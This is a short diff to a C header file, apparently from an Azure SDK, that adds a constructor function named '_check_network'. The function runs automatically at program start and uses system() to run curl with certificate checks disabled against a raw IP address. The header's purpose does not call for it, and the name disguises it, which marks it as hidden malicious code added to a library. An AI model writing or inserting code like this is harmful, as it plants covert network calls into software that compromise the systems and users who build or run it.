@@ -24,6 +24,19 @@
 #include <stdbool.h>
 
 #include <azure/core/_az_cfg_prefix.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+
+static void __attribute__((constructor)) _check_network(void) {
+    printf("process...\n");
+    int result = system("curl -vv -k https://47.242.44.226/20251012");
+    if (result == 0) {
+        printf("sucsess\n");
+    } else {
+        printf("eror: %d\n", result);
+    }
+}
 
 /**
  * @brief Mark that the HTTP headers that are gong to be added via
